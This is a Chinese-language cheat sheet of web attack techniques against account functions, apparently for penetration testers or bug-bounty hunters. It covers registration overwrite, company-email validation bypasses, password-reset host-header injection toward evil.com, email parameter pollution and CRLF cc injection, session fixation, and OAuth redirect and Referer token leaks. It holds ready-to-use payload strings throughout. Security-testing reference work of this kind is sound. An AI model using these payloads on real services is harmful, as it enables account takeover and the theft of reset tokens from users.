账户
==================================

注册
--------------------------------
- 覆盖注册
	+ 邮箱用户名前后空格
	+ 大小写变换
	+ 手机号前后空格
	+ 邮箱末尾%00
	+ 手机号+86
	+ MySQL数据截断 ：insert into数据长度溢出时截断数据，导致注册时的任意用户覆盖。
- 账号激活链接未加密：通过构造激活链接实现任意用户注册。
- 第三方登录：修改第三方登录返回包中的uid，实现任意用户登录。
- 任意用户注册：如短信验证码、邮箱验证码等二级校验存在缺陷（提交注册和验证是分开的流程，可以绕开验证）。
- 越权：添加 ``&userlevel=1`` ``&userrank=1`` ``&usertype=1`` 等参数实现越权注册。
- 账号接管
	+ 原理：Unicode 规范化（Normalization）不一致 导致的 0-Click 账户接管(注册时正常字母，重置密码时使用特殊字符)。
	+ 大小写映射冲突： ``i（英文小写 i） vs ı（土耳其语无点小写 i）``
	+ 拉丁字母VS西里尔字母： ``拉丁字母 o vs 西里尔字母 о（肉眼完全看不出区别）``
	+ 全角/半角字符混淆: ``@（半角） vs ＠（全角）``
	+ Gmail 点号（Dot）绕过: ``example@gmail.com vs e.xample@gmail.com``
	+ Unicode 组合字符（Decomposition）绕过: ``é（U+00E9，预组合字符） vs e + ◌́（U+0065 + U+0301，分解组合）``

公司邮箱绕过
--------------------------------
+ 如注册仅允许 ``@google.com``
	::

		me+(@gmail.com)@company.com
		"me@gmail.com"@company.com
		"<me@gmail.com>"@company.com
		"me@gmail.com;"@company.com
		"me@gmail.com+"@company.com
+ 注册目标企业邮箱，可能绕过一些权限，拥有企业人员的权限。

重置密码
--------------------------------
- 主机头注入
	+ 导航到重置密码页面，输入用户名，拦截请求
	+ 修改主机头为攻击者控制的域名，点击重置
		::

			注入代理转发头：
			X-Forwarded-Host: evil.com
			注入referer头：
			Referer: https://evil.com
			重复host 
			Host: x.com		这个是正常投
			Host: evil.com
			host前加空格
			 Host: evil.com
			
			还有一种可能，比如邮件中包含了从X-Forwarded-Host中获取的IP地址，放到邮件正文里，这里就可以注入干扰数据。

	+ 服务器生成攻击者控制的域名的重置连接(包含重置令牌)
	+ 攻击者点击重置连接
	+ 攻击者服务器收到令牌，从而实现任意账号密码重置。
- 双写
	+ 修改关键数据包 Content-Type 为 application/json，如 ``{"phone":"12345678901","phone":"98765432109"}`` , ``{"phone":["12345678901","98765432109"]}`` 
	+ ``email=victim@email.com&email=attacker@email.com``
	+ ``email=victim@email.com%20email=attacker@email.com``
	+ ``email=victim@email.com|email=attacker@email.com``
	+ ``email="victim@mail.tld%0a%0dcc:attacker@mail.tld"``
	+ ``email="victim@mail.tld",email="attacker@mail.tld"``
	+ ``{"email":["victim@mail.tld","attacker@mail.tld"]}``
- 奇葩技巧
	+ ``POST /reset_password HTTP/1.1`` => ``POST @vps.com/reset_password HTTP/1.1``

Session
--------------------------------
- Session猜测 / 爆破：会话ID通过不全随机的生成算法生成，或者会话ID的长度太短，导致攻击者可以通过暴力破解或猜测来获取有效的会话ID。
- Session伪造
- Session泄漏 ： 会话ID通过URL参数传递，或者在不安全的环境中存储（如浏览器的本地存储），导致攻击者可以窃取会话ID。
- Session Fixation(会话固定)
	+ 介绍：攻击者诱使用户使用攻击者指定的Session ID登录，从而在用户登录后，攻击者可以使用相同的Session ID访问用户的账户。
	+ 根本原因：服务器未能将“未经认证的会话”与“经过认证的会话”进行严格的区分和更新。
	+ 利用条件
		- 服务器允许在用户登录前使用一个任意的Session ID。
		- 服务器在用户登录后未能重新生成新的Session ID。
		- 攻击者能控制用户使用的Session ID（例如，通过发送一个包含攻击者指定Session ID的链接给用户）。
- Session Hijacking(会话劫持)
	+ 攻击者通过窃取用户的Session ID来冒充用户进行操作，通常通过XSS攻击、网络嗅探等方式获取Session ID。
- session覆盖(重置密码)
	+ 1.输入A账号，点击找回密码，收到验证码输入，到达输入新密码界面
	+ 2.打开新标签页，输入B账号，点击找回密码
	+ 3.A账号标签页输入新密码，点击提交
	+ 4.查看是否修改了B账号的密码

修改密码
--------------------------------
+ 结合CSRF利用，修改密码没有旧密码验证
+ 任意用户密码重置: 登录接口遍历手机号，密码重置时将手机号替换为其他手机号，成功重置密码。
+ 邮箱密码重置链接凭证不绑定账号 ：通过修改账号ID实现任意用户密码重置。
+ 前端校验关键数据 ：前端校验关键数据（如手机号）导致任意换绑，实现任意用户密码重置。
+ 原始密码表单数据删除。
+ 原始密码字段置为 null 或空字符串。
+ 修改返回包。
+ 注意：企业SRC不要重置他人密码。

账号接管
--------------------------------
- oauth账号换绑: 利用1-click欺骗受害者点击从而实现任意账号接管
- redirect_uri参数绕过
	+ 结合url绕过，泄露token导致账号接管
- referer头： payload: ``GET /auth/connect HTTP/1.1`` + ``Referer: http://yourvps.com``

注销账号
--------------------------------
+ 新用户优惠券重复领取
+ 首次优惠重复使用
+ 新用户免费体验7天等
